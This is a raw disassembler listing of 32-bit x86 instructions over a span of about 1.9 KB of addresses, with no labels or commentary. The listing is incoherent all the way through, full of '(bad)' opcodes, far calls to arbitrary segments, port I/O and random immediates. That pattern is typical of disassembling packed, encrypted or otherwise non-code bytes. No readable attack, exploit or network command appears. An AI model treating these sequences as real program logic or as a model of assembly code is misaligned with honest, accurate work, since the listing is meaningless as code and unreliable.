  4bee48:	xor    al,0xa4
  4bee4a:	jnp    0x4bee3c
  4bee4c:	lock xchg edx,eax
  4bee4e:	pop    es
  4bee4f:	(bad)  
  4bee50:	mov    DWORD PTR [ebp-0x1eb28e7b],edx
  4bee56:	inc    ecx
  4bee57:	call   0xab6a:0x6520c91c
  4bee5e:	push   ss
  4bee5f:	pop    ebp
  4bee60:	loopne 0x4bee66
  4bee62:	in     al,0xf1
  4bee64:	adc    BYTE PTR [eax+0x43],ch
  4bee67:	dec    ecx
  4bee68:	shl    BYTE PTR [eax+0x1903f812],cl
  4bee6e:	inc    eax
  4bee6f:	daa    
  4bee70:	(bad)  
  4bee71:	pop    ss
  4bee72:	mov    WORD PTR [ebp+0x67c08239],fs
  4bee78:	add    eax,DWORD PTR [edi+0x16a35e10]
  4bee7e:	lods   al,BYTE PTR ds:[esi]
  4bee7f:	int    0x18
  4bee81:	push   ebp
  4bee82:	add    ecx,DWORD PTR [edi+0x4b58d83c]
  4bee88:	rcr    BYTE PTR [edx-0xc],cl
  4bee8b:	push   ebp
  4bee8c:	fsubr  QWORD PTR [esi]
  4bee8e:	mov    ecx,0x12d21851
  4bee93:	mov    esi,DWORD PTR [edx+0x7a]
  4bee96:	repz das 
  4bee98:	fs gs in eax,0x48
  4bee9c:	inc    ebp
  4bee9d:	inc    esp
  4bee9e:	mov    ah,0x4
  4beea0:	push   eax
  4beea1:	push   ebp
  4beea2:	sbb    BYTE PTR [ecx+0x6f],cl
  4beea5:	popa   
  4beea6:	add    BYTE PTR [edi+0x56],cl
  4beea9:	mov    DWORD PTR [ebp+0x5b296c18],ebx
  4beeaf:	pop    edi
  4beeb0:	mov    bh,0xe
  4beeb2:	mov    dh,0x3f
  4beeb4:	jge    0x4beecd
  4beeb6:	pop    eax
  4beeb7:	in     al,dx
  4beeb8:	sub    al,0x6c
  4beeba:	mov    ch,0x76
  4beebc:	arpl   WORD PTR [eax],ax
  4beebe:	mov    al,ds:0x11e1147
  4beec3:	or     eax,0xeaf010c6
  4beec8:	or     al,0x18
  4beeca:	shr    eax,cl
  4beecc:	mov    edx,0x8d38cc2f
  4beed1:	lea    eax,[ecx+0x1280c251]
  4beed7:	pop    edi
  4beed8:	adc    DWORD PTR ds:0x3007a227,ecx
  4beede:	mov    ds:0xe085b91a,al
  4beee3:	dec    eax
  4beee4:	xchg   ebx,eax
  4beee5:	jo     0x4bee9d
  4beee7:	jne    0x4beef6
  4beee9:	cmp    WORD PTR [edi],si
  4beeec:	and    eax,0x8b5d231a
  4beef1:	jb     0x4bef03
  4beef3:	mov    esp,DWORD PTR [eax]
  4beef5:	loopne 0x4beedd
  4beef7:	inc    ebx
  4beef8:	(bad)  
  4beef9:	in     eax,0x2b
  4beefb:	and    dh,BYTE PTR [ebp+0x0]
  4beefe:	dec    BYTE PTR [edi+0x1f]
  4bef01:	mov    DWORD PTR [eax],ebx
  4bef03:	lea    ecx,[eax+0x4]
  4bef06:	(bad)  
  4bef07:	fptan  
  4bef09:	inc    edi
  4bef0a:	lea    eax,[edi+0x1]
  4bef0d:	mov    DWORD PTR [ebp+0x18],ecx
  4bef10:	push   cs
  4bef11:	adc    al,0x25
  4bef13:	add    al,0x99
  4bef15:	pop    edx
  4bef17:	sbb    BYTE PTR [eax],al
  4bef19:	fistp  WORD PTR [edx+0x2aa965f8]
  4bef1f:	(bad)  
  4bef21:	add    ecx,DWORD PTR [ecx]
  4bef23:	mov    ah,0x20
  4bef25:	mov    ss:0x1ca5f0d0,al
  4bef2b:	xor    esi,ecx
  4bef2d:	jp     0x4beec1
  4bef2f:	cmp    DWORD PTR [esi+eax*2],0xff5b08f1
  4bef36:	pop    es
  4bef37:	xchg   DWORD PTR [eax],edx
  4bef39:	sub    DWORD PTR [ebp-0x4],0x10
  4bef3d:	xor    ah,ah
  4bef3f:	or     ebp,ecx
  4bef41:	les    esp,FWORD PTR [ebp+edx*2+0x9165c74]
  4bef48:	or     esi,DWORD PTR [esi]
  4bef4a:	mov    edi,0x8b5376fc
  4bef4f:	push   ebp
  4bef50:	iret   
  4bef51:	add    esi,DWORD PTR [esp+ebx*2]
  4bef54:	retf   0x6efb
  4bef57:	inc    eax
  4bef58:	inc    edx
  4bef59:	or     ah,BYTE PTR [edi]
  4bef5b:	mov    esp,0xb84c2a85
  4bef60:	in     eax,dx
  4bef61:	mov    dh,0xf0
  4bef63:	add    dh,BYTE PTR [ebp+0x27]
  4bef66:	add    DWORD PTR [esi+0x66],edx
  4bef69:	mov    ecx,DWORD PTR [eax+ebx*2+0x3c96338]
  4bef70:	mov    edx,0x1213f481
  4bef75:	xor    al,0x72
  4bef77:	adc    al,0x81
  4bef79:	xor    BYTE PTR [ebp+0x660b7f5],0x74
  4bef80:	mov    ah,0x5b
  4bef82:	or     BYTE PTR [esi],bh
  4bef84:	inc    eax
  4bef85:	sub    ebx,0x10
  4bef88:	cmp    bl,bl
  4bef8a:	adc    cl,BYTE PTR [ecx+esi*8+0x56c072c7]
  4bef91:	and    al,BYTE PTR [eax]
  4bef93:	ret    
  4bef94:	add    eax,0xf61a8a58
  4bef99:	ret    
  4bef9a:	or     al,0x1c
  4bef9c:	dec    ebx
  4bef9d:	add    cl,BYTE PTR [edi+0x9b38512]
  4befa3:	mov    ecx,0xe4e4c496
  4befa8:	mov    ebx,0x6c724898
  4befad:	and    ch,BYTE PTR [eax+0x18837449]
  4befb3:	mov    ah,cl
  4befb5:	push   cs
  4befb6:	loopne 0x4bef58
  4befb8:	cmp    eax,eax
  4befba:	mov    ah,0xd6
  4befbc:	cmp    BYTE PTR [esi-0x8],cl
  4befbf:	inc    eax
  4befc0:	mov    eax,ds:0x28eb8e35
  4befc5:	push   ss
  4befc6:	outs   dx,DWORD PTR ds:[esi]
  4befc7:	test   al,0x12
  4befc9:	push   es
  4befca:	fcom   DWORD PTR [edx+0x719c0c06]
  4befd0:	fnstcw WORD PTR [eax+0x532cde70]
  4befd6:	push   ecx
  4befd7:	inc    edi
  4befd8:	adc    BYTE PTR [ebx+0x3dd154a5],ch
  4befde:	adc    al,0x29
  4befe0:	inc    eax
  4befe1:	dec    ebp
  4befe2:	lds    esi,FWORD PTR [ebp+0x3b]
  4befe5:	push   0xffffffec
  4befe7:	pop    edx
  4befe8:	sbb    DWORD PTR [ebp+0x30],edi
  4befeb:	in     al,0x57
  4befed:	pop    edx
  4befee:	xchg   esp,eax
  4befef:	rol    BYTE PTR [ebp-0x55],0x86
  4beff3:	into   
  4beff4:	into   
  4beff5:	jns    0x4bef93
  4beff7:	jbe    0x4bf06e
  4beff9:	(bad)  
  4beffa:	mov    BYTE PTR [edi+ecx*8],0x77
  4beffe:	aaa    
  4befff:	adc    bh,BYTE PTR [ebx]
  4bf001:	test   BYTE PTR [ebx+0x93d39e8],al
  4bf007:	mov    esp,DWORD PTR [edx]
  4bf009:	sbb    eax,0x261a473b
  4bf00e:	sti    
  4bf00f:	test   al,0x52
  4bf011:	das    
  4bf012:	mov    eax,ds:0xee265fa3
  4bf017:	push   edx
  4bf018:	mov    al,dh
  4bf01a:	adc    ecx,eax
  4bf01c:	loopne 0x4bf080
  4bf01e:	or     eax,0x102f5111
  4bf023:	mov    ebx,0x4f01fb06
  4bf028:	in     eax,dx
  4bf029:	inc    edx
  4bf02a:	je     0x4bf0a0
  4bf02c:	and    bh,BYTE PTR [edx-0x193cf3aa]
  4bf032:	mov    DWORD PTR [ebx],0xf5f0c1c0
  4bf038:	cmp    edi,DWORD PTR [edi]
  4bf03a:	dec    esp
  4bf03b:	push   eax
  4bf03c:	es pop es
  4bf03e:	pop    eax
  4bf03f:	sub    edx,DWORD PTR es:[eax]
  4bf042:	ja     0x4bf09c
  4bf044:	lock mov WORD PTR [ebp-0x45be8a53],?
  4bf04b:	xor    ebp,DWORD PTR [bx+si-0x1e7]
  4bf050:	retf   0x3774
  4bf053:	test   BYTE PTR [ebp+esi*4-0x7b7ee003],0x4
  4bf05b:	pop    ebx
  4bf05c:	lock jne 0x4bf076
  4bf05f:	mov    WORD PTR [ebx],?
  4bf061:	or     BYTE PTR [edx],bl
  4bf063:	push   ebx
  4bf064:	push   edi
  4bf065:	sahf   
  4bf066:	mov    dh,0x9c
  4bf068:	je     0x4bf0b2
  4bf06a:	mov    cl,0x75
  4bf06c:	push   cs
  4bf06d:	push   ebx
  4bf06e:	arpl   cx,si
  4bf070:	int    0x6c
  4bf072:	addr16 enter 0x46e3,0x2
  4bf077:	sub    ebx,DWORD PTR [esi]
  4bf079:	mov    cl,BYTE PTR [ecx]
  4bf07b:	and    al,0x97
  4bf07d:	shr    DWORD PTR [ebp+0x44],0x18
  4bf081:	mov    bh,0x85
  4bf083:	sbb    BYTE PTR [ecx+0x535c85a0],cl
  4bf089:	call   0x3518:0x88014b13
  4bf090:	mov    BYTE PTR [ebx-0x6a],bh
  4bf093:	cli    
  4bf094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bf095:	adc    bh,BYTE PTR [ebx+0x76d98bde]
  4bf09b:	and    eax,0x57010c19
  4bf0a0:	adc    al,BYTE PTR [edi+0x12]
  4bf0a3:	addr16 push edx
  4bf0a5:	clc    
  4bf0a6:	cmp    eax,0x788d110b
  4bf0ab:	add    ebp,ebx
  4bf0ad:	or     al,0xc9
  4bf0af:	xlat   BYTE PTR ds:[ebx]
  4bf0b0:	xor    edx,eax
  4bf0b2:	aam    0x5
  4bf0b4:	jge    0x4bf073
  4bf0b6:	or     DWORD PTR [edx+esi*2+0x5ab0a0d],ebx
  4bf0bd:	mov    bl,0x11
  4bf0bf:	dec    esi
  4bf0c0:	call   0x576eb09d
  4bf0c5:	xchg   DWORD PTR [edi+edx*4+0x19e7a40d],eax
  4bf0cc:	push   ebx
  4bf0cd:	dec    esp
  4bf0ce:	add    DWORD PTR [edi],eax
  4bf0d0:	in     eax,dx
  4bf0d1:	sub    esi,DWORD PTR [ebp-0x66]
  4bf0d4:	stc    
  4bf0d5:	adc    ebp,DWORD PTR [ecx-0x5277dccc]
  4bf0db:	dec    eax
  4bf0dc:	cmp    DWORD PTR [eax+0x38],esp
  4bf0df:	call   0x6d44:0xf5751718
  4bf0e6:	cld    
  4bf0e7:	cli    
  4bf0e8:	pop    es
  4bf0e9:	popa   
  4bf0ea:	arpl   WORD PTR [ebx],dx
  4bf0ec:	or     ebx,ebp
  4bf0ee:	sbb    al,0xc0
  4bf0f0:	pusha  
  4bf0f1:	mov    ch,0x37
  4bf0f3:	mov    al,ds:0x3123713b
  4bf0f8:	mov    al,0x72
  4bf0fa:	(bad)  
  4bf0fb:	or     ah,BYTE PTR [ebx+0x4e]
  4bf0fe:	and    eax,0x24447c82
  4bf103:	adc    BYTE PTR [ecx-0x16ff64b2],dh
  4bf109:	fmul   QWORD PTR [edx]
  4bf10b:	jl     0x4bf0d1
  4bf10d:	pop    es
  4bf10e:	(bad)  [esi+0x21]
  4bf111:	aaa    
  4bf112:	xlat   BYTE PTR ds:[ebx]
  4bf113:	retf   
  4bf114:	sbb    eax,0x15c76b07
  4bf119:	sub    eax,0x9902640
  4bf11e:	push   ss
  4bf11f:	adc    DWORD PTR [ecx],ecx
  4bf121:	add    bl,BYTE PTR fs:[ecx+0x40990b10]
  4bf128:	es nop
  4bf12a:	or     bl,BYTE PTR [edx]
  4bf12c:	adc    dl,BYTE PTR [eax+0x8026409]
  4bf132:	push   es
  4bf133:	add    bl,BYTE PTR [ecx+0xe0f2640]
  4bf139:	es nop
  4bf13b:	or     DWORD PTR [esp+edx*1+0x13],esp
  4bf13f:	add    DWORD PTR [edx+eax*1-0x67],esp
  4bf143:	inc    eax
  4bf144:	add    eax,DWORD PTR [edi]
  4bf146:	inc    eax
  4bf147:	es nop
  4bf149:	or     DWORD PTR [ebx+ebx*1],eax
  4bf14c:	or     DWORD PTR [edx+eax*1-0x67],esp
  4bf150:	add    bl,BYTE PTR [ecx+ebx*4]
  4bf153:	inc    eax
  4bf154:	es nop
  4bf156:	add    eax,0x990000c
  4bf15b:	add    bl,BYTE PTR fs:[ecx]
  4bf15e:	sbb    BYTE PTR [ebx],al
  4bf160:	cdq    
  4bf161:	inc    eax
  4bf162:	es pop ss
  4bf164:	or     edx,ebp
  4bf166:	push   edx
  4bf167:	pop    es
  4bf168:	adc    ch,BYTE PTR [edx+eax*2]
  4bf16b:	xchg   BYTE PTR [esi],ah
  4bf16d:	mov    al,0x52
  4bf16f:	dec    edi
  4bf170:	out    0x3d,al
  4bf172:	mov    al,0x85
  4bf174:	xchg   bl,cl
  4bf176:	jnp    0x4bf1c9
  4bf178:	pop    ebx
  4bf179:	cmovg  esp,DWORD PTR [eax]
  4bf17c:	hlt    
  4bf17d:	sub    dl,al
  4bf17f:	mov    esi,0x228d5829
  4bf184:	fidiv  WORD PTR [edx]
  4bf186:	and    eax,0x522a291a
  4bf18b:	cdq    
  4bf18c:	iret   
  4bf18d:	add    eax,0xd8e034c3
  4bf192:	mov    ch,0xd0
  4bf195:	scas   al,BYTE PTR es:[edi]
  4bf196:	push   ebp
  4bf197:	or     DWORD PTR [ecx+0x4b],edi
  4bf19a:	fadd   DWORD PTR [edi]
  4bf19c:	mov    cl,0x35
  4bf19e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bf19f:	icebp  
  4bf1a0:	shl    DWORD PTR [ebx],cl
  4bf1a2:	fld    TBYTE PTR [eax+edx*4-0x28d01988]
  4bf1a9:	fld    QWORD PTR [bx+si-0x5b]
  4bf1ad:	and    al,0xa7
  4bf1af:	xchg   cl,bl
  4bf1b1:	push   eax
  4bf1b2:	adc    bl,BYTE PTR [ebp+ecx*2+0x1]
  4bf1b6:	out    0xd4,eax
  4bf1b8:	call   0x22d5:0xce017cd8
  4bf1bf:	add    al,0xbb
  4bf1c1:	hlt    
  4bf1c2:	fs dec esp
  4bf1c4:	add    al,0x1
  4bf1c6:	jmp    0x955fb5de
  4bf1cb:	cwde   
  4bf1cc:	cmp    eax,0x852bf3
  4bf1d1:	push   cs
  4bf1d2:	mov    esi,0x5aa344b
  4bf1d7:	cmp    DWORD PTR [ecx+0x28],ecx
  4bf1da:	(bad)  
  4bf1db:	sub    BYTE PTR [ebx],dh
  4bf1dd:	fidivr DWORD PTR [eax]
  4bf1df:	inc    esi
  4bf1e0:	and    BYTE PTR [ebx+edi*4],ah
  4bf1e3:	mov    al,ds:0x3d4009a0
  4bf1e8:	loopne 0x4bf1db
  4bf1ea:	inc    edi
  4bf1eb:	dec    ecx
  4bf1ec:	js     0x4bf179
  4bf1ee:	xor    eax,0x20e3754f
  4bf1f3:	ss inc edx
  4bf1f5:	xchg   ecx,eax
  4bf1f6:	lea    eax,[edx+0x56]
  4bf1f9:	enter  0xf0d1,0xba
  4bf1fd:	push   eax
  4bf1fe:	xor    DWORD PTR [ecx],0x11
  4bf201:	mov    al,ss:0x31efe784
  4bf207:	add    DWORD PTR [eax+0x2d],0x11db11f4
  4bf20e:	dec    eax
  4bf20f:	xchg   BYTE PTR [ecx],dh
  4bf211:	lea    esp,[ebx-0x4f]
  4bf214:	sub    al,BYTE PTR [edx+0x493dff84]
  4bf21a:	aam    0xa8
  4bf21c:	cmp    eax,0x430eb991
  4bf221:	sub    ah,BYTE PTR [ecx+esi*1+0x1c]
  4bf225:	daa    
  4bf226:	jge    0x4bf288
  4bf228:	bound  ecx,QWORD PTR ds:0xc414b78d
  4bf22e:	dec    ebx
  4bf22f:	aas    
  4bf230:	cmp    DWORD PTR [eax+0x6cde8b32],0x9f094630
  4bf23a:	sbb    eax,0x27c6469f
  4bf23f:	in     eax,0x6b
  4bf241:	(bad)  
  4bf242:	mov    gs,WORD PTR ds:0xb803f701
  4bf248:	or     al,0xc7
  4bf24a:	xchg   DWORD PTR [ebx-0x7f],esi
  4bf24d:	xor    ch,BYTE PTR [edx]
  4bf24f:	and    DWORD PTR [ebx],ebp
  4bf251:	pop    edx
  4bf252:	ret    
  4bf253:	sbb    ebx,ebx
  4bf255:	rol    bl,1
  4bf257:	les    edx,FWORD PTR [esi]
  4bf259:	rcl    BYTE PTR [edx+eax*1],0xd8
  4bf25d:	or     DWORD PTR [esi+0x16],esi
  4bf260:	pop    ebp
  4bf261:	out    0x4a,eax
  4bf263:	pop    ds
  4bf264:	es push es
  4bf266:	ret    0xe457
  4bf269:	sbb    BYTE PTR [esi-0x7d],bh
  4bf26c:	jl     0x4bf2b1
  4bf26e:	jns    0x4bf2ab
  4bf270:	mov    ecx,DWORD PTR [edi]
  4bf272:	aas    
  4bf273:	(bad)  
  4bf274:	or     eax,0xf50d6f0e
  4bf279:	retf   
  4bf27a:	xor    edx,DWORD PTR [edx-0x79]
  4bf27d:	sub    dl,BYTE PTR ds:0x8993e89f
  4bf283:	inc    esp
  4bf284:	sbb    DWORD PTR [ebx],ecx
  4bf286:	pop    es
  4bf287:	sbb    eax,0x4380038b
  4bf28c:	mov    esp,esi
  4bf28e:	adc    bh,al
  4bf290:	or     edi,DWORD PTR [eax-0x3bdff87c]
  4bf296:	or     al,0xcf
  4bf298:	add    eax,0x8927476e
  4bf29d:	push   ds
  4bf29e:	add    eax,0x5be039c7
  4bf2a3:	test   eax,0x797c6007
  4bf2a8:	fwait
  4bf2a9:	pop    edx
  4bf2aa:	mov    ah,ah
  4bf2ac:	mov    ds:0xa960956a,al
  4bf2b1:	cmc    
  4bf2b2:	inc    eax
  4bf2b3:	cdq    
  4bf2b4:	cld    
  4bf2b5:	in     eax,dx
  4bf2b6:	pop    edx
  4bf2b7:	stos   DWORD PTR es:[edi],eax
  4bf2b8:	inc    eax
  4bf2b9:	cmp    DWORD PTR [ecx+0x2f049295],edi
  4bf2bf:	sub    DWORD PTR ds:0x38a75231,esi
  4bf2c5:	outs   dx,DWORD PTR ds:[esi]
  4bf2c6:	out    dx,al
  4bf2c7:	xor    bh,bh
  4bf2c9:	mov    bl,0xba
  4bf2cb:	je     0x4bf29a
  4bf2cd:	sbb    al,0x82
  4bf2cf:	mov    BYTE PTR [edx-0x68],ah
  4bf2d2:	cs pushf 
  4bf2d4:	rol    BYTE PTR [ebx+0x1ba05638],0xf7
  4bf2db:	or     eax,0xcb4330a5
  4bf2e0:	cmp    esi,eax
  4bf2e2:	jle    0x4bf26b
  4bf2e4:	xchg   ecx,eax
  4bf2e5:	mov    ch,0xa1
  4bf2e7:	aam    0xa5
  4bf2e9:	jae    0x4bf2cc
  4bf2eb:	push   edx
  4bf2ec:	mov    ah,0x11
  4bf2ee:	pop    edx
  4bf2ef:	or     esp,DWORD PTR [ecx+0x3482b143]
  4bf2f5:	inc    eax
  4bf2f6:	push   esi
  4bf2f7:	mov    BYTE PTR [edx],ch
  4bf2f9:	and    bl,BYTE PTR [ecx+0x16ef806a]
  4bf2ff:	jae    0x4bf343
  4bf301:	dec    eax
  4bf302:	jmp    0x230:0xefd75c3a
  4bf309:	and    al,0x7e
  4bf30b:	or     BYTE PTR [edi+0x72fffb80],bl
  4bf311:	pop    ds
  4bf312:	jno    0x4bf36e
  4bf314:	nop
  4bf315:	sti    
  4bf316:	cmp    DWORD PTR [eax],ebx
  4bf318:	xor    eax,0x6c48230d
  4bf31d:	cmp    BYTE PTR [edi+ebp*2+0x33c92f0d],ah
  4bf324:	ret    0xcf91
  4bf327:	jo     0x4bf375
  4bf329:	fcomp  QWORD PTR [esi+eax*2+0x420d6b69]
  4bf330:	sbb    eax,0xf32b03c1
  4bf335:	pop    ebp
  4bf336:	push   edi
  4bf337:	pop    ebx
  4bf338:	push   cs
  4bf339:	adc    ah,ch
  4bf33b:	loope  0x4bf2f1
  4bf33d:	fs jns 0x4bf3b2
  4bf340:	dec    edi
  4bf341:	or     ebp,ebx
  4bf343:	outs   dx,DWORD PTR ds:[esi]
  4bf344:	adc    eax,0x8da62d08
  4bf349:	ffree  st(0)
  4bf34b:	repnz int3 
  4bf34d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bf34e:	clc    
  4bf34f:	add    ebx,DWORD PTR [esi]
  4bf351:	sbb    bh,ah
  4bf353:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bf354:	jge    0x4bf326
  4bf356:	jb     0x4bf35c
  4bf358:	sbb    ah,bh
  4bf35a:	cmp    eax,esi
  4bf35c:	jne    0x4bf38d
  4bf35e:	dec    esp
  4bf35f:	add    ah,BYTE PTR [ebp-0x4a]
  4bf362:	xchg   DWORD PTR [edx],ebx
  4bf364:	adc    BYTE PTR [ecx],dl
  4bf366:	lods   al,BYTE PTR ds:[esi]
  4bf367:	inc    ecx
  4bf368:	ds int3 
  4bf36a:	and    al,0x20
  4bf36c:	in     eax,0x20
  4bf36e:	or     al,0xa5
  4bf370:	adc    BYTE PTR [esi+0xe],dh
  4bf373:	and    al,0x46
  4bf375:	pop    ss
  4bf376:	jg     0x4bf364
  4bf378:	ja     0x4bf331
  4bf37a:	push   es
  4bf37b:	add    DWORD PTR [ecx+0x287454a7],ebp
  4bf381:	add    al,0x2e
  4bf383:	adc    bl,BYTE PTR [ecx-0x5cf3c8fc]
  4bf389:	iret   
  4bf38a:	push   edi
  4bf38b:	std    
  4bf38c:	push   edi
  4bf38d:	mov    eax,ds:0x33f22000
  4bf392:	aaa    
  4bf393:	sbb    cl,BYTE PTR [ebx-0x212b56f1]
  4bf399:	aam    0x2f
  4bf39b:	pop    ss
  4bf39c:	icebp  
  4bf39d:	xor    DWORD PTR [ecx],edx
  4bf39f:	add    dl,al
  4bf3a1:	cmp    DWORD PTR [ebx],ecx
  4bf3a3:	ror    ah,0x45
  4bf3a6:	addr16 loopne 0x4bf33c
  4bf3a9:	ror    BYTE PTR [edi+0x54041705],0x9d
  4bf3b0:	or     DWORD PTR [ebx],ecx
  4bf3b2:	add    eax,0x4115707e
  4bf3b7:	cmp    al,BYTE PTR [ebx+esi*8-0x23]
  4bf3bb:	cld    
  4bf3bc:	mov    al,0xa
  4bf3be:	xor    BYTE PTR [edx],cl
  4bf3c0:	xor    DWORD PTR [ebx],ebp
  4bf3c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bf3c3:	es xchg esp,ecx
  4bf3c6:	fild   QWORD PTR [ecx+ebp*1]
  4bf3c9:	loop   0x4bf3ee
  4bf3cb:	test   BYTE PTR [ebx+eax*8+0x38],bl
  4bf3cf:	push   ebx
  4bf3d0:	pop    es
  4bf3d1:	imul   eax,DWORD PTR [ebx],0xc360d52
  4bf3d7:	pop    esi
  4bf3d8:	fist   WORD PTR [eax]
  4bf3da:	ficom  WORD PTR [ebx+0x13]
  4bf3dd:	loope  0x4bf3b8
  4bf3df:	push   eax
  4bf3e0:	push   ebx
  4bf3e1:	jmp    0x48d92c68
  4bf3e6:	aas    
  4bf3e7:	cmp    BYTE PTR [esi-0x4c7efbcc],dl
  4bf3ed:	pop    ss
  4bf3ee:	and    bl,dl
  4bf3f0:	pusha  
  4bf3f1:	or     ebp,ebp
  4bf3f3:	cmp    BYTE PTR [ecx-0x5ba2006f],cl
  4bf3f9:	and    DWORD PTR [ebx+0x3f83fd12],0x68
  4bf400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bf401:	mov    ds:0x6502527,eax
  4bf406:	add    BYTE PTR [esi+0x2a],bl
  4bf409:	call   0x2bad1e2f
  4bf40e:	pop    ebp
  4bf40f:	lock addr16 adc eax,0x2b0125f4
  4bf416:	jge    0x4bf40c
  4bf418:	ins    DWORD PTR es:[edi],dx
  4bf419:	add    eax,0x6a41c14b
  4bf41e:	call   0x72641336
  4bf423:	fwait
  4bf424:	dec    edx
  4bf425:	mov    esi,DWORD PTR [ebp-0x71bc6cf7]
  4bf42b:	sub    ebp,DWORD PTR [eax]
  4bf42d:	lock add BYTE PTR [ebx],cl
  4bf430:	sbb    esi,DWORD PTR [ebp+0x35315d2a]
  4bf436:	lods   al,BYTE PTR ds:[esi]
  4bf437:	and    dh,bh
  4bf439:	imul   ebx,DWORD PTR [ebx-0x6e544ef9],0x12
  4bf440:	mov    dh,0x45
  4bf442:	outs   dx,DWORD PTR ds:[esi]
  4bf443:	sbb    al,0xac
  4bf445:	mov    DWORD PTR [edx],0x305efea4
  4bf44b:	sub    al,0x57
  4bf44d:	add    al,0x7b
  4bf44f:	sub    al,0xfc
  4bf451:	xlat   BYTE PTR ds:[ebx]
  4bf452:	push   eax
  4bf453:	mov    ah,0xca
  4bf455:	add    ebp,DWORD PTR ds:0x90812a3d
  4bf45b:	jl     0x4bf41d
  4bf45d:	pop    ss
  4bf45e:	fild   DWORD PTR [edx+0x44]
  4bf461:	add    DWORD PTR [esi],0xffffffac
  4bf464:	mov    esi,0x4e1a15db
  4bf469:	xor    eax,0xb25319e0
  4bf46e:	sub    BYTE PTR [esi],dh
  4bf470:	leave  
  4bf471:	push   esp
  4bf472:	loopne 0x4bf4c2
  4bf474:	add    ebp,DWORD PTR [edx]
  4bf476:	popa   
  4bf477:	sub    BYTE PTR [esi],cl
  4bf479:	test   BYTE PTR [ebp-0x652446fa],ah
  4bf47f:	cli    
  4bf480:	or     eax,0x2082121a
  4bf485:	inc    edx
  4bf486:	cmp    BYTE PTR [eax+0x6b56add4],ah
  4bf48c:	add    ch,dh
  4bf48e:	ins    DWORD PTR es:[edi],dx
  4bf48f:	add    al,0xc1
  4bf491:	xchg   bl,ah
  4bf493:	inc    eax
  4bf494:	dec    eax
  4bf495:	rol    BYTE PTR [eax-0x1c],0x24
  4bf499:	je     0x4bf509
  4bf49b:	in     eax,dx
  4bf49c:	add    BYTE PTR [edi+0x285ad3a0],0x85
  4bf4a3:	je     0x4bf453
  4bf4a5:	jb     0x4bf4f2
  4bf4a7:	ja     0x4bf46b
  4bf4a9:	shr    BYTE PTR [edi+0x7d90ed24],0xe
  4bf4b0:	mov    ah,bh
  4bf4b2:	add    BYTE PTR [esi+0x68],dl
  4bf4b5:	pop    ecx
  4bf4b6:	sbb    eax,0xce1d6901
  4bf4bb:	loop   0x4bf4ea
  4bf4bd:	push   edx
  4bf4be:	sub    ebx,ebp
  4bf4c0:	adc    BYTE PTR [eax+0xa],dh
  4bf4c3:	lea    esi,[ecx+edx*1-0x59]
  4bf4c7:	or     eax,0x20f89178
  4bf4cc:	jbe    0x4bf46e
  4bf4ce:	jmp    0x4bf518
  4bf4d0:	gs jo  0x4bf521
  4bf4d3:	dec    edx
  4bf4d4:	ret    0x2694
  4bf4d7:	int    0xb9
  4bf4d9:	scas   al,BYTE PTR es:[edi]
  4bf4da:	adc    esp,eax
  4bf4dc:	xor    BYTE PTR [eax-0x22efda43],bh
  4bf4e2:	lahf   
  4bf4e3:	ins    DWORD PTR es:[edi],dx
  4bf4e4:	sub    cl,al
  4bf4e6:	les    esp,FWORD PTR [ebx*8+0x341943e1]
  4bf4ed:	or     dh,BYTE PTR [esi+0x3d626589]
  4bf4f3:	xchg   edx,eax
  4bf4f4:	out    0x18,al
  4bf4f6:	(bad)  
  4bf4f7:	popa   
  4bf4f8:	sbb    al,0xff
  4bf4fa:	jne    0x4bf54c
  4bf4fc:	xchg   edi,eax
  4bf4fd:	dec    esp
  4bf4fe:	push   ecx
  4bf4ff:	fisubr DWORD PTR [eax+0x35]
  4bf502:	and    al,0x65
  4bf504:	cmp    BYTE PTR [ebx+0x1],cl
  4bf507:	push   es
  4bf508:	nop
  4bf509:	adc    eax,0x88a5c291
  4bf50e:	outs   dx,DWORD PTR ds:[esi]
  4bf50f:	pop    ss
  4bf510:	mov    ds:0xd78da4a9,eax
  4bf515:	aam    0x68
  4bf517:	adc    DWORD PTR [edx],edi
  4bf519:	push   ebx
  4bf51a:	mov    edx,0x3b36e829
  4bf51f:	xchg   DWORD PTR [ebp-0x1792be96],ebx
  4bf525:	or     al,0xcd
  4bf527:	imul   esi,DWORD PTR [ebp+0x40],0x15714194
  4bf52e:	pinsrw mm5,esi,0x8b
  4bf532:	mov    ah,0x48
  4bf534:	jns    0x4bf580
  4bf536:	cdq    
  4bf537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bf538:	mov    ecx,DWORD PTR [esi+0x64ed9d8]
  4bf53e:	dec    esi
  4bf53f:	mov    dl,0x57
  4bf541:	cmp    BYTE PTR [esi-0xb3ed65f],ah
  4bf547:	test   BYTE PTR [eax],bl
  4bf549:	retf   0xf504
  4bf54c:	leave  
  4bf54d:	mov    bh,0x69
  4bf54f:	test   al,0xef
  4bf551:	pop    ebp
  4bf552:	jmp    0x41dbf798
  4bf557:	scas   al,BYTE PTR es:[edi]
  4bf558:	pop    edx
  4bf559:	jns    0x4bf567
  4bf55b:	add    ebx,DWORD PTR [eax-0x4f]
  4bf55e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bf55f:	add    ebx,DWORD PTR [ebx-0x25]
  4bf562:	sbb    al,0xb2
  4bf564:	inc    esi
  4bf565:	adc    al,0xb3
  4bf567:	mov    bh,0x35
  4bf569:	arpl   WORD PTR [ecx],si
  4bf56b:	inc    edx
  4bf56c:	sub    eax,0x158cd501
  4bf571:	arpl   WORD PTR ds:0x1070c801,sp
  4bf577:	and    esp,DWORD PTR [edi]
  4bf579:	sar    DWORD PTR [edi-0x3c],cl
  4bf57c:	dec    edx
  4bf57d:	add    ebx,DWORD PTR [edi+0x7a7931d0]
  4bf583:	test   eax,0xd8d58a51
  4bf588:	adc    DWORD PTR [edx-0x4f],ebp
  4bf58b:	aaa    
  4bf58c:	jecxz  0x4bf5c2
  4bf58e:	call   DWORD PTR [ebx+ebx*2-0x67de0196]
  4bf595:	sub    DWORD PTR [edx+ebp*2-0x67d2be01],ebp
  4bf59c:	sub    DWORD PTR [esi*1+0x54e3a004],ebp
  4bf5a3:	idiv   DWORD PTR [esi+0x6e]
  4bf5a6:	inc    esp
